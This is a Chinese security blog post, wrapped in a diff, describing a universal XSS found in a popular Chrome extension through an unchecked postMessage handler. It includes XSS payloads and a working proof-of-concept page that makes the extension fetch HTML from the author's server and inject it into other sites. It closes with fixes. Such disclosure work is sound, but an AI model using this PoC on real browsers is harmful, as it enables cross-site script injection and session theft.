@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  
+  <title>Chrome 扩展安全研究 - 一个UXSS的挖掘经历 - Nearg1e</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script type="text/javascript" src="/js/highlight.pack.js"></script>
+  <script type="text/javascript" src="https://tajs.qq.com/stats?sId=58637942" charset="UTF-8"></script>
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link rel="alternative" href="/atom.xml" title="Nearg1e" type="application/atom+xml">
+  
+  <!--[if lt IE 9]>
+    <script type="text/javascript" src="/js/html5.js"></script>
+    <script type="text/javascript" src="/js/css3-mediaqueries.js"></script>
+  <![endif]-->
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+
+</head>
+<body>
+    <header id="header">
+    <div class="nav-warp">
+      <nav id="nav" class="w">
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/about/#link">Link</a>
+        
+          <a class="main-nav-link" href="/atom.xml">RSS</a>
+        
+          <a class="main-nav-link" href="https://github.com/neargle">Project</a>
+        
+        <a id="nav-search" class="icon-search fr" onclick="show_search()" title="Search"></a>
+        <div id="nav-search-input" class="hide">
+          <form class="search-form" onsubmit="return dispatch()">
+            <input type="hidden" id="site" value="site:https://blog.neargle.com">
+            <input type="text" id="q" class="input-text" name="q" placeholder="Search">
+            <input type="submit" value="" class="input-submit">
+          </form>
+        </div>
+      </nav>
+    </div>
+    
+  </header>
+
+  <!-- <div id='wrap'> -->
+    <div id='outer'>
+      <section id="main"><article class="post">
+  <header class="post-head">
+    
+  
+    
+      <h1 class="post-title">Chrome 扩展安全研究 - 一个UXSS的挖掘经历</h1>
+    
+  
+
+    
+<time datetime="2018-02-14T05:42:21.000Z" class="post-time">2018-02-14</time>
+
+  </header>
+  
+  <section class="post-content typo">
+    <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>有点想把标题换成 <chrome 安全研究:="" 一个uxss的挖掘经历=""> 来骗一波点击。但毕竟其实是扩展的问题，还是老实点写“扩展”吧。</chrome></p>
+<p>这是我春节前挖到的一个漏洞，大概抓取了用户量top400的 Chrome 扩展，对比较在意的几个问题写了脚本删选了一部分出来，再逐个审计。本次讲的这个漏洞是想产出 UXSS 的时候挖的 UXSS 漏洞之一。我觉得比较典型，涉及到 content_scripts 和 background 脚本及其他 Chrome 扩展的特性，相对来说比较有趣，坑也稍微多一点。</p>
+<p>由于不能公开插件详情，我把该插件和漏洞相关的源码抽出来，去掉一些带有公司名的关键字，放到 github 上:</p>
+<p><a href="https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss" target="_blank" rel="noopener">https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss</a></p>
+<p><code>git clone</code> 到本地，打开 chrome://extensions/， 开启“开发者模式”, 点击 “加载已解压的扩展程序…” 按钮，选择 content_scripts_uxss 文件夹即可。</p>
+<p><img src="https://p0.ssl.qhimg.com/t01c468de71c3e4dbac.jpg" alt=""></p>
+<a id="more"></a>
+<h2 id="manifest-json"><a href="#manifest-json" class="headerlink" title="manifest.json"></a>manifest.json</h2><p>manifest.json 是 Chrome 扩展的清单文件，Chrome 解析扩展时会检查这个文件的内容是否符合规范。审计也一般从这里开始：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"content_script_uxss_example"</span>,</span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"一个由原型修改而来会产生UXSS的Chrome插件"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"1.0"</span>,</span><br><span class="line">    <span class="attr">"manifest_version"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"background"</span>: &#123;</span><br><span class="line">        <span class="attr">"scripts"</span>: [</span><br><span class="line">            <span class="string">"/core/js/jquery.min.js"</span>,</span><br><span class="line">            <span class="string">"/core/js/background.js"</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"author"</span>: <span class="string">"neargle@sec-news"</span>,</span><br><span class="line">    <span class="attr">"content_scripts"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"matches"</span>: [</span><br><span class="line">                <span class="string">"http://*/*"</span>,</span><br><span class="line">                <span class="string">"https://*/*"</span>,</span><br><span class="line">                <span class="string">"file:///*/*"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"exclude_matches"</span>: [],</span><br><span class="line">            <span class="attr">"js"</span>: [</span><br><span class="line">                <span class="string">"/core/js/jquery.min.js"</span>,</span><br><span class="line">                <span class="string">"/core/js/content_script.js"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"run_at"</span>: <span class="string">"document_end"</span>,</span><br><span class="line">            <span class="attr">"all_frames"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关注点在 background 和 content_scripts:</p>
+<ol>
+<li><p>background 可以设置一个扩展创建时就一直在后台存在的页面，只有关闭扩展才会使这个页面绑定的事件失效，重启扩展或浏览器才可以使定义的全局变量重新定义（Mac 下 <code>command + Q</code>）。如果设置了 <code>page</code> 属性， 如 <code>&quot;background&quot;:{&quot;page&quot;: &quot;background.html&quot;}</code>, 则这个文件就是该扩展的后台页面，可以访问 <code>chrome-extension://{扩展ID}/background.html</code> 进行调试，像本例中只设置了 scripts 属性的情况， 那么 Chrome 会自己生成这个 page 页面，地址在 <code>chrome-extension://{扩展ID}/_generated_background_page.html</code>。</p>
+</li>
+<li><p>content_scripts 可以设置多个， 每一次访问一个 url 符合 matches 的匹配条件且不符合 exclude_matches 里所写的排除条件时，会运行 “js” 里设置的脚本。 matches 可以使用 <code>&lt;all_urls&gt;</code> 匹配所有 url。”run_at” 设置的是 content_scripts 的运行时间， all_frames 为 true 的时候，页面中 iframe 内部的页面也会触发 content_scripts。</p>
+</li>
+</ol>
+<p>background 和 content_scripts 及我们所运行的原本的网页，都不在同一个运行时上下文内，里面定义的变量不可互相访问，每个 runtime 可以访问的 api 也有所不同。但可以使用 <code>window.addEventListener</code> 给原本页面的 window 添加事件，通过事件操作 DOM 结构，background 和 content_scripts 之间的相互作用也经常使用 <code>chrome.extension.onRequest.addListener</code> 或 <code>chrome.runtime.onMessage.addListener</code> 进行。</p>
+<h2 id="content-scripts"><a href="#content-scripts" class="headerlink" title="content_scripts"></a>content_scripts</h2><p>最开始我注意点其实是 /core/js/content_script.js 中的第 <a href="https://github.com/neargle/hacking-extensions/blob/master/content_scripts_uxss/core/js/content_script.js#L68" target="_blank" rel="noopener">#68</a> 行的代码:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (location.href.indexOf(<span class="string">"?"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = location.href.split(<span class="string">"?"</span>)[<span class="number">1</span>].split(<span class="string">"&amp;"</span>);</span><br><span class="line">    $(a).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="keyword">this</span>.split(<span class="string">"="</span>);</span><br><span class="line">        query[b[<span class="number">0</span>]] = b[<span class="number">1</span>]</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一般插件内部使用的 jquery 版本不经常更新，该插件使用的 jquery 版本是 v1.7.1，存在如下漏洞:</p>
+<p><img src="https://p5.ssl.qhimg.com/t010b799eabf6e15f26.jpg" alt="jquery selector domxss"></p>
+<p>而 a 参数的值很显然是获取当前 url 的 GET 请求参数，如果它直接使用 <code>location.search</code>， 那么 Chrome 里面里面会进行 url 编码， 比较难以利用，但是这里的这种写法却是可以使用 hash 来 bypass 的，设置一个如 <code>#?&lt;img src=@ onerror=prompt()&gt;</code> 可以使得 <code>a=[&quot;&lt;img src=@ onerror=prompt()&gt;&quot;]</code>, 例如 <code>https://www.baidu.com/#?&lt;img src=@ onerror=prompt()&gt;</code>。</p>
+<p>但是，当 jquery 传入的选择器为数组的时候，该函数并不会触发漏洞， 如 <code>$([&#39;&lt;img src=1 onerror=prompt()&gt;&#39;])</code>。而且之后发现了更加有趣的 postmessage 接口，就把注意力转移到了接下来的代码上。</p>
+<h3 id="message-事件"><a href="#message-事件" class="headerlink" title="message 事件"></a>message 事件</h3><p>扩展内使用 message 事件的情况，并不少见，在我爬取的 top400 的扩展中，有将近 200 插件在 content_script 内对 window 添加了 message 监听事件，本例中也有 <a href="https://github.com/neargle/hacking-extensions/blob/master/content_scripts_uxss/core/js/content_script.js#L3" target="_blank" rel="noopener">content_script.js#L3</a>:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (a.data != <span class="literal">undefined</span>) &#123;</span><br><span class="line">    plugdata = a.data;</span><br><span class="line">    <span class="keyword">if</span> (plugdata.Action != <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">if</span> (plugdata.Action == <span class="string">"GETCOOKIE"</span>) chrome.extension.sendRequest(plugdata, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (plugdata.Action != <span class="string">"VERSION"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (plugdata.background == <span class="literal">undefined</span> || plugdata.background == <span class="literal">false</span>) $(<span class="string">"#divDetail"</span>).html(<span class="string">"&lt;br/&gt;&lt;center&gt;notifications with some message.&lt;/center&gt;"</span>);</span><br><span class="line">        chrome.extension.sendRequest(plugdata, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>这里的 a.data 就是 postMessage 第一个参数传入的值，例如我们用 <code>ww = window.open(&#39;https://www.google.com/&#39;);ww.postMessage(&quot;aaaaa&quot;, &quot;*&quot;);</code> 发送一个message，那么这个 a.data 就等于 “aaaaa”。</p>
+<p>可以发现，这段代码在判断了一下 data.Action 之后，就把 data 的值用 chrome.extension.sendRequest 发送了出去。这也是在浏览器插件里面经常出现的逻辑，因为正常的html页面并不能访问 chrome.extension 的api，如果需要发送信息到 <code>chrome.extension.onRequest.addListener</code> 或 <code>chrome.runtime.onMessage.addListener</code> 的回调函数内的话， 在 content_script 里面做一次中转也是经常采用的方法。</p>
+<p>注意 content_script 有一个经常出现 domxss 输出函数 <code>html</code>:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chrome.extension.onRequest.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (a.Action) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"FAREResult"</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"ONRESULT"</span>:</span><br><span class="line">        <span class="keyword">typeof</span> a.Data.Data === <span class="string">"string"</span> ? $(<span class="string">"#IRData"</span>).val(a.Data.Data) : $(<span class="string">"#IRData"</span>).val(<span class="built_in">JSON</span>.stringify(a.Data.Data));</span><br><span class="line">        $(<span class="string">"#Message"</span>).html(a.Data.Message);</span><br><span class="line">        $(<span class="string">"#Command"</span>).html(a.Data.Action);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>不过这里需要原本页面的 dom 结构里面包含一些条件，必须带有 #Message 和 #Command 两个id的html元素，显然并不是我们想要的。如果页面符合这个条件的话，我们就可以直接使用 <code>ww = window.open(&#39;https://www.google.com/&#39;);ww.postMessage({&quot;Action&quot;:&quot;ONRESULT&quot;, &quot;Message&quot;:&quot;&lt;img src=1 onerror=prompt()&gt;&quot;}, &quot;*&quot;);</code> 即可造成跨到 google 域的xss攻击。</p>
+<p>而 PerformAction 函数却有一个这样的输出，<code>$(&quot;body&quot;).html(b)</code>, 这显然就很通用了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PerformAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (plugdata != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = plugdata.Action;</span><br><span class="line">    <span class="keyword">switch</span> (plugdata.Method) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"POST"</span>:</span><br><span class="line">            $.post(plugdata.URL, plugdata.post, <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (plugdata.SetBodyText == <span class="literal">true</span>) <span class="keyword">try</span> &#123;</span><br><span class="line">                    $(<span class="string">"body"</span>).html(b)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (c) &#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>可是原本 plugdata 的定义就为 null, 怎么使其不为 null 进入条件呢？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#Version"</span>).html(<span class="string">"5.10"</span>);</span><br><span class="line">    chrome.extension.sendRequest(&#123;</span><br><span class="line">        Action: <span class="string">"ONLOAD"</span></span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">        plugdata = b;</span><br><span class="line">        PerformAction()</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>可以发现 PerformAction 调用之前有一个赋值，可以使用 {Action: “ONLOAD”} 对其进行赋值，而对 {Action: “ONLOAD”} 的响应，则在 background.js 内:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> RequestQ = [],</span><br><span class="line">    plugdata = <span class="literal">null</span>,</span><br><span class="line">    IRTab = <span class="literal">null</span>,</span><br><span class="line">    IRData = <span class="literal">null</span>,</span><br><span class="line">    requestFilter = &#123;</span><br><span class="line">        urls: [<span class="string">"&lt;all_urls&gt;"</span>]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">chrome.extension.onRequest.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">    $.extend(a, &#123;</span><br><span class="line">        TabID: b.tab.id</span><br><span class="line">    &#125;);</span><br><span class="line">    plugdata = a;</span><br><span class="line">    <span class="keyword">switch</span> (a.Action) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"VERSION"</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"ONLOAD"</span>:</span><br><span class="line">            c(IRData);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"GETFARE"</span>:</span><br><span class="line">            IRData = a;</span><br><span class="line">            $.extend(a, &#123;</span><br><span class="line">                RequesterTabID: b.tab.id</span><br><span class="line">            &#125;);</span><br><span class="line">            chrome.tabs.getAllInWindow(<span class="literal">null</span>, OngetAllInWindow);</span><br><span class="line">            c(&#123;&#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>
+<p>这里如果之前不了解 background_page 的特性的话是比较绝望的，因为对于 plugdata 的赋值来自于 chrome.extension.onRequest.addListener 的回调函数 c， 而 c 的参数则是 IRData 也为 null, 也就是说正常来讲 <code>plugdata = IRData = null</code>。 虽然我可以发送 {“Action”: “GETFARE”} 来设置 IRData 的值，但是如果 background_page 和 content_script 一样是每一次刷新页面执行一次的话，那就很尴尬了。因为PerformAction 的执行在 <code>$(document).ready(</code>, 我必须要要求页面过一段时间再执行 <code>$(document).ready(</code> 以求我能在 PerformAction 之前 postMessage 一个 {“Action”: “GETFARE”}，其实这里并不需要这样。 （当然这样的条件竞争也是可以达成的，让 <code>$(document).ready(</code> 等一段时间的方法也有很多，一个src地址返回比较慢的script标签就是一个方法）</p>
+<h2 id="background-page"><a href="#background-page" class="headerlink" title="background page"></a>background page</h2><p>思考了一下 background page 的设计需求，我觉得它不应该像 content_script 一样每次访问页面执行一次。看了一些官方文档，并写了几个 demo，确定了以下两点：</p>
+<ol>
+<li>background 并不是每次访问页面执行一次，内部定义的变量不会因为页面刷新而重新定义。</li>
+<li>background 即使域改变也不会重新定义和赋值，所有的域都用一个 runtime。</li>
+</ol>
+<p>第一点使得这个漏洞更加容易利用，第二点使得我们所写的 payload 并不只影响在 payload 中利用的网站，而是在浏览器和插件为重启之前，每次访问新的页面都可以在不同域下触发 payload.</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>思路明确了之后，我们只需先 postmessage 一个 <code>{Action: &quot;GETFARE&quot;,Data: {//payload看下面源码}}</code>， 把 IRData 设置为 Data 属性里的 payload， 再刷新页面使其重新执行 PerformAction 函数，PerformAction 会发送一个post请求到 plugdata.URL 上，并把返回传递到 <code>$(&quot;body&quot;).html(b)</code> 的 b 参数中。（重新设置 iframe 的 src 即可刷新页面）</p>
+<p>ps. 由于最近p师傅的 note 神器，证书不能用了，我只能先用我自己没有认证的证书来，baidu 属于 https，要发送 ajax 请求，对象也必须得是 https. 且需要设置 Access-Control-Allow-Origin 和 Access-Control-Allow-Methods。 <strong>请大家在访问poc前，先访问 <a href="https://case.neargle.com" target="_blank" rel="noopener">https://case.neargle.com</a> ，认证一下那个破证书</strong>。</p>
+<p>在插件已经启用的前提下打开以下链接链接即可，跨域到 www.baidu.com 执行 xss。且之后再访问任意网站 payload 都会执行。</p>
+<p>poc: <a href="https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html">https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>content script uxss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hacking-extensions<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>source code: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss"</span>&gt;</span>https://github.com/neargle/hacking-extensions/tree/master/content_scripts_uxss<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- poc content --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://www.baidu.com"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        subframe = frames[0];</span></span><br><span class="line"><span class="undefined">        data = &#123;</span></span><br><span class="line"><span class="javascript">        Action: <span class="string">"GETFARE"</span>,</span></span><br><span class="line"><span class="undefined">            Data: &#123;&#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        data.Method = <span class="string">"POST"</span>;</span></span><br><span class="line"><span class="javascript">        data.URL = <span class="string">"https://case.neargle.com/payload/uxss_payload.php"</span>;</span></span><br><span class="line"><span class="javascript">        data.SetBodyText = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">        data.post = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="string">'subframe.postMessage(data, "*")'</span>, <span class="number">2000</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">'iframe'</span>).src = <span class="string">"https://www.baidu.com"</span>;</span></span><br><span class="line"><span class="undefined">        &#125;, 3000);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><video id="video" controls preload="none"><br>    <source id="mp4" src="http://case.neargle.com/payload/chrome-ext-uxss-video.mp4" type="video/mp4"><br></video>
+
+<p>首先访问 <a href="https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html">https://blog.neargle.com/hacking-extensions/content_scripts_uxss/poc.html</a> 触发漏洞，在依次访问 <a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a> 和 <a href="https://www.google.com/" target="_blank" rel="noopener">https://www.google.com/</a> 证明第二个结论。</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>修复方法有很多，最为常见的就是限定 postMessage 的 source 为当前 window，例如 <code>evt.source === window</code>，这个是大部分插件采用的方法，如 <a href="https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=zh-CN" target="_blank" rel="noopener">React Developer Tools</a> 的代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleMessageFromPage</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    evt.source === <span class="built_in">window</span> &amp;&amp; evt.data &amp;&amp; <span class="string">"react-devtools-bridge"</span> === evt.data.source &amp;&amp; port.postMessage(evt.data.payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当然这种防御方式也是可能被 bypass 并受到UXSS影响的，这里暂且不提。</p>
+<p>这个插件的情况，其实功能只提供给部分网站，限定 event.origin, 只给部分网站提供该需求即可。例如: <code>event.origin === &quot;https://baidu.com&quot;</code>.</p>
+<h2 id="插件爬虫及其它"><a href="#插件爬虫及其它" class="headerlink" title="插件爬虫及其它"></a>插件爬虫及其它</h2><p>本次选取的插件，大概有 500000+ 用户(数据更新至2018年春节前)，国内使用的人数较少，大家不用担心受到影响。</p>
+<p>使用的爬虫，是之前和蘑菇同学做的研究 <chrome 插件探针=""> 遗留下来的一部分项目修改的，可以参考当时研究的paper: <a href="https://mp.weixin.qq.com/s/HHPxGTk55oEw0Pj4TRg6FA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/HHPxGTk55oEw0Pj4TRg6FA</a> 和 <a href="https://github.com/neargle/ChromeExtensionKnower" target="_blank" rel="noopener">https://github.com/neargle/ChromeExtensionKnower</a> 项目。</chrome></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</a></li>
+<li><a href="https://developer.chrome.com/apps/getstarted" target="_blank" rel="noopener">https://developer.chrome.com/apps/getstarted</a></li>
+<li><a href="https://domstorm.skepticfx.com/modules/?id=5739f797c9e0250300990938" target="_blank" rel="noopener">https://domstorm.skepticfx.com/modules/?id=5739f797c9e0250300990938</a></li>
+<li><a href="https://github.com/neargle/tips-note/tree/master/postMessage_and_addEventListener_message" target="_blank" rel="noopener">https://github.com/neargle/tips-note/tree/master/postMessage_and_addEventListener_message</a></li>
+</ul>
+
+    <p class="origin-url">本文URL： <a href="https://blog.neargle.com/2018/02/14/hacking-chrome-extensions-chapter-one-a-uxss/index.html">https://blog.neargle.com/2018/02/14/hacking-chrome-extensions-chapter-one-a-uxss/index.html</a></p>
+  </section>
+  
+  <footer class="post-foot">
+    <section class="post-foot-warp clear">
+      
+  <ul class="post-tag icon-tag fl">
+    
+      <li><a href="/tags/安全研究-浏览器安全/">#安全研究, 浏览器安全</a></li>
+    
+  </ul>
+
+      
+    </section>
+  </footer>
+  
+</article>
+
+    
+<nav id="post-nav" class="clear">
+  
+  
+    <a href="/2018/01/29/ver-observer-a-tool-about-version-detection/" id="post-nav-older" class="post-nav-link-wrap fr" title="VER-OBSERVER 一个可以探测框架及依赖版本的命令行工具">
+      <div class="post-nav-title">VER-OBSERVER 一个可以探测框架及依赖版本的命令行工具 &raquo;</div>
+    </a>
+  
+</nav>
+
+
+
+<section id="comments">
+  <div id="disqus_thread">
